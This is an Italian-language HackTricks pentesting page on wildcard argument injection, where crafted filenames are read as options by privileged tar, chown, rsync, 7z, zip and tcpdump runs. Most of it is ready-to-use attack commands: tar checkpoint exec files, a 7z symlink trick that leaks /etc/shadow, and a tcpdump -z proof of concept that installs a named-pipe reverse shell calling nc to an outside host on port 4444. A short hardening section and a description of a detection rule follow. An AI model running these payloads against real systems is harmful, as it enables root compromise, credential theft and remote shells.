# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> L'iniezione di **argomenti wildcard** (noto anche come *glob*) si verifica quando uno script privilegiato esegue un binario Unix come `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard non quotato come `*`.
> Poiché la shell espande il wildcard **prima** di eseguire il binario, un attaccante che può creare file nella directory di lavoro può creare nomi di file che iniziano con `-` in modo che vengano interpretati come **opzioni invece di dati**, permettendo di contrabbandare flag arbitrari o persino comandi.
> Questa pagina raccoglie le primitive più utili, le ricerche recenti e le rilevazioni moderne per il 2023-2025.

## chown / chmod

Puoi **copiare il proprietario/gruppo o i bit di autorizzazione di un file arbitrario** abusando del flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quando root esegue successivamente qualcosa come:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` viene iniettato, causando che *tutti* i file corrispondenti ereditino la proprietà/i permessi di `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (attacco combinato).
Vedi anche il classico documento di DefenseCode per i dettagli.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Esegui comandi arbitrari abusando della funzionalità **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Una volta che root esegue ad esempio `tar -czf /root/backup.tgz *`, `shell.sh` viene eseguito come root.

### bsdtar / macOS 14+

Il `tar` predefinito su macOS recenti (basato su `libarchive`) *non* implementa `--checkpoint`, ma puoi comunque ottenere l'esecuzione di codice con il flag **--use-compress-program** che ti consente di specificare un compressore esterno.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Quando uno script privilegiato esegue `tar -cf backup.tar *`, verrà avviato `/bin/sh`.

---

## rsync

`rsync` ti consente di sovrascrivere la shell remota o persino il binario remoto tramite flag da riga di comando che iniziano con `-e` o `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se l'utente root archivia successivamente la directory con `rsync -az * backup:/srv/`, il flag iniettato genera la tua shell sul lato remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Anche quando lo script privilegiato *difensivamente* antepone il carattere jolly con `--` (per fermare l'analisi delle opzioni), il formato 7-Zip supporta **file di elenco file** anteponendo il nome del file con `@`. Combinando ciò con un symlink ti consente di *esfiltrare file arbitrari*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se root esegue qualcosa come:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tenterà di leggere `root.txt` (→ `/etc/shadow`) come un elenco di file e uscirà, **stampando il contenuto su stderr**.

---

## zip

`zip` supporta il flag `--unzip-command` che viene passato *verbatim* alla shell di sistema quando l'archivio verrà testato:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Injecta il flag tramite un nome file creato ad arte e attendi che lo script di backup privilegiato chiami `zip -T` (test archive) sul file risultante.

---

## Binaries aggiuntivi vulnerabili all'iniezione di wildcard (lista rapida 2023-2025)

I seguenti comandi sono stati abusati in CTF moderni e in ambienti reali. Il payload è sempre creato come un *nome file* all'interno di una directory scrivibile che sarà successivamente elaborata con una wildcard:

| Binary | Flag da abusare | Effetto |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrario `@file` | Leggi il contenuto del file |
| `flock` | `-c <cmd>` | Esegui il comando |
| `git`   | `-c core.sshCommand=<cmd>` | Esecuzione del comando tramite git su SSH |
| `scp`   | `-S <cmd>` | Avvia un programma arbitrario invece di ssh |

Queste primitive sono meno comuni rispetto ai classici *tar/rsync/zip* ma vale la pena controllarle durante la caccia.

---

## ganci di rotazione tcpdump (-G/-W/-z): RCE tramite iniezione argv nei wrapper

Quando una shell ristretta o un wrapper del fornitore costruisce una riga di comando `tcpdump` concatenando campi controllati dall'utente (ad es., un parametro "nome file") senza una rigorosa citazione/validazione, puoi contrabbandare flag extra di `tcpdump`. La combinazione di `-G` (rotazione basata sul tempo), `-W` (limita il numero di file) e `-z <cmd>` (comando post-rotazione) consente l'esecuzione arbitraria di comandi come l'utente che esegue tcpdump (spesso root su dispositivi).

Precondizioni:

- Puoi influenzare `argv` passato a `tcpdump` (ad es., tramite un wrapper come `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Il wrapper non sanifica spazi o token con prefisso `-` nel campo del nome file.

PoC classica (esegue uno script di reverse shell da un percorso scrivibile):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Dettagli:

- `-G 1 -W 1` forza una rotazione immediata dopo il primo pacchetto corrispondente.
- `-z <cmd>` esegue il comando post-rotazione una volta per rotazione. Molte build eseguono `<cmd> <savefile>`. Se `<cmd>` è uno script/interprete, assicurati che la gestione degli argomenti corrisponda al tuo payload.

Varianti senza supporto rimovibile:

- Se hai un altro primitivo per scrivere file (ad es., un wrapper di comando separato che consente la redirezione dell'output), inserisci il tuo script in un percorso noto e attiva `-z /bin/sh /path/script.sh` o `-z /path/script.sh` a seconda della semantica della piattaforma.
- Alcuni wrapper dei fornitori ruotano verso posizioni controllabili dall'attaccante. Se puoi influenzare il percorso ruotato (symlink/traversal di directory), puoi indirizzare `-z` per eseguire contenuti che controlli completamente senza media esterni.

Suggerimenti per il rafforzamento per i fornitori:

- Non passare mai stringhe controllate dall'utente direttamente a `tcpdump` (o a qualsiasi strumento) senza liste di autorizzazione rigorose. Cita e valida.
- Non esporre la funzionalità `-z` nei wrapper; esegui tcpdump con un modello fisso sicuro e vieta completamente flag aggiuntivi.
- Riduci i privilegi di tcpdump (solo cap_net_admin/cap_net_raw) o esegui sotto un utente non privilegiato dedicato con confinamento AppArmor/SELinux.

## Rilevamento e Rafforzamento

1. **Disabilita la globbing della shell** negli script critici: `set -f` (`set -o noglob`) previene l'espansione dei caratteri jolly.
2. **Cita o scappa** gli argomenti: `tar -czf "$dst" -- *` *non* è sicuro — preferisci `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Percorsi espliciti**: Usa `/var/www/html/*.log` invece di `*` in modo che gli attaccanti non possano creare file fratelli che iniziano con `-`.
4. **Minimo privilegio**: Esegui lavori di backup/manutenzione come un account di servizio non privilegiato invece di root quando possibile.
5. **Monitoraggio**: La regola predefinita di Elastic *Potential Shell via Wildcard Injection* cerca `tar --checkpoint=*`, `rsync -e*`, o `zip --unzip-command` immediatamente seguito da un processo figlio della shell. La query EQL può essere adattata per altri EDR.

---

## Riferimenti

* Elastic Security – Regola rilevata Potenziale Shell tramite Wildcard Injection (ultimo aggiornamento 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (18 dicembre 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
